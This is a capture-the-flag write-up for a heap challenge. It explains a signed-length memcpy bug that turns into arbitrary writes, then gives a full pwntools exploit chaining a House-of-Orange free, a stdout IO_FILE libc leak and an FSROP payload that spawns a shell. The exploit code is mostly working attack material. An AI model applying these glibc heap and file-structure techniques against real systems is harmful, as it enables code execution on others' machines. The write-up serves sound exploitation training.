# Intro
This challenge is simple but verbose. The vulnerability is a heap-based `https://github.com/n132/RetroverFlow`, which was found by (@Swing, @leommxj, and @n132) about one year ago. We didn't make it public until I found the challenge author also found that.

The challenge was solved by @zolutal and @n132 in the game.

# Vulnerability
The challenge is actually not such hard if we understand the memcpy behaviors while giving a corrupted third parameter.

The figure in this repo shows the behavior correct (not for avx512, which the challenge used):


- The block size diffs for different CPU feat, I take avx for an example:
- Forward Copying: 0x80 bytes
- Backwards Copying: 0x20 bytes
- Backwards Copying: 0x80 bytes
- Return without crashing

By controling the third parameter of memcpy (`len`), we are able to write arbitrary addresses.

# Challenge 

The challenge only provides two simple primitives
- Allocation from malloc, size<=0x100  (usage limit: 8 times)
- Vulnerable memcpy

The vulnerability comes from a signed value comparison:
```c
printf("len: ");
__isoc99_scanf("%ld", &n);
if ( n <= size_arrary[dst] && n <= size_arrary[src] )// n is a signed int_64
  memcpy(ptr_arrary[dst], ptr_arrary[src], n);
else
  printf("[!] invalid copy size\n");
```


# Soulution 



The first problem is leaking. We have no leaking for this challenge so we have to build a leaking privilege. 
We chose to do `IO_FILE` leaking after partially writing an coppied address on `tcache_entry`. The copied address comes from the House-of-orange free. (we corrupted the top-chunk size and used scanf to allocate a big chunk which gonna free the top chunk).

Then we performed FSROP to get the shell.


# Exp

Author: @zolutal
Success Rate: 1/(1<<12)

```py
from pwn import *
context.arch='amd64'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
#p=process('./copy_patched')
ru         = lambda a:     p.readuntil(a)
r         = lambda n:        p.read(n)
sla     = lambda a,b:     p.sendlineafter(a,b)
sa         = lambda a,b:     p.sendafter(a,b)
sl        = lambda a:     p.sendline(a)
s         = lambda a:     p.send(a)
def cmd(c):
    sla(b"> ",str(c).encode())
def add(size,c=b'\n'):
    cmd(0)
    sla(b": ",str(size).encode())
    if size!=0:
        p.send(c)
def dup(dst,src,l):
    cmd(1)
    sla(b": ",str(dst).encode())
    sla(b": ",str(src).encode())
    sla(b": ",str(l).encode())


attempt_no = 0
while True:
    context.log_level='info'
    attempt_no += 1
    print("Attempt:", attempt_no)

    #with process("./copy_patched") as p:
    with remote('bounty-board.chal.pwni.ng', 1337) as p:
    #with remote('localhost', 1337) as p:
        add(0x100,(b'\1'*0x78+p64(0xbe0)).ljust(0xcc,b'\1').ljust(0x100, b'\0'))#0
        add(0x77)#1
        dup(1,0,-0x100)

        cmd('0'*0x1000)

        #sla(b": ",str(0x10).encode())#2
        #p.send(b'\0'*0x8+p64(0x7ffff7e045c0))
        sla(b": ",str(0xa).encode())#2
        p.send(b'\0'*0x8+p16(0x45c0))

        pay = [2]*0x100
# for x in range(0x80):
#     if x in [72,73]:
#         pay [x]= 1
        payload = b''
        for x in range(0x100):
            payload += p8(pay[x]%0x100)
        add(0x100,payload)#3

        add(0xa,b'\1'*8+p16(0x45c0))#4
        add(0x80)#5

        dup(0,2,-0x8)

        dup(0,3,-0x160)

        try:

            #context.log_level='debug'
            add(0xe7,p64(0x1802)+b'\0'*0x18+b'\n')#5
            leak = p.recvuntil(b"[[ Menu ]]")[6:-13]
        except:
            print("retrying...")
            continue

        print(hexdump(leak))

        try:
            libc_base = u64(leak[0x45f0:0x45f8]) - 0x204644
            print(f"LIBC BASE: {libc_base:#x}")
        except:
            print("retrying from later...")
            continue

        #pause()

        dup(0,3,-0x120)

# STDOUT + 0
# flags
        payload = p32(0xdeadbee0) + b";sh\0"
#payload += b"; sh\0\0\0\0"
        payload += p64(0)
# read_end
        payload += p64((libc_base + 0x7ffff7e045c0 - 0x00007ffff7c00000) - 0x68 + 0x18)
# read_base
        payload += p64((libc_base + 0x7ffff7c58750 - 0x00007ffff7c00000))
        payload = payload.ljust(48, b'\0')
        payload += p64((libc_base + 0x7ffff7e045c0 - 0x00007ffff7c00000) - 0x68 + 0x28)
        payload = payload.ljust(104, b'\0')
        payload += p64(libc_base + 0x7ffff7c58750 - 0x00007ffff7c00000)
# ... + 136
        payload = payload.ljust(136-8, b'\0')
        payload += p64(libc_base + 0x7ffff7e045c0 - 0x00007ffff7c00000)
# lock
        payload += p64(libc_base + 0x7ffff7e045c0 - 0x00007ffff7c00000)
# ... + 160
        payload = payload.ljust(160, b'\0')
# wide_data
        payload += p64((libc_base + 0x7ffff7e045c0 - 0x00007ffff7c00000) - 0xe0 + 0x80)
# ... + 216
        payload = payload.ljust(216, b'\0')
# vtable
        payload += p64((libc_base + 0x7ffff7e02228 - 0x00007ffff7c00000) - 0x20)
# ... + 224

        print(hexdump(payload))

        #gdb.attach(p,'bof 0x146F')


        payload += p64(libc_base + 0x00007ffff7e044e0-0x00007ffff7c00000)
        payload += p64(libc_base + 0x00007ffff7e045c0-0x00007ffff7c00000)
        payload += p64(libc_base + 0x00007ffff7e038e0-0x00007ffff7c00000)
        payload += p64(libc_base + 0x00007ffff7ffd000-0x00007ffff7c00000)

        add(0x100, payload)

        dup(6,7,-0x100)

        sl(b'cat /flag')


        p.interactive()

```

